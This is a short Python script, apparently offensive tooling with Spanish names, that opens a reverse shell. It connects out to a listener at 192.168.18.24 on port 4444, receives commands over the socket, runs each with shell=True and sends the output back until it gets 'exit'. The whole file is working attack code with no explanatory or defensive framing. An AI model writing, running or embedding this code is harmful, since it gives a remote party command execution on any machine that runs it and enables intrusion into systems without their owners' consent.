import socket
import subprocess

def ejecutar_comandos(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.18.24", 4444))

connection.send(b"\n [+]Conexion Establecida\n")

while True:
    command = connection.recv(1024).decode('utf-8')
    if command.strip().lower() ==  "exit":
        break
    try:
        result_in_command = ejecutar_comandos(command)
        connection.send(result_in_command)
    except subprocess.CalledProcessError as e:
        connection.send(str(e).encode('utf-8'))

connection.close()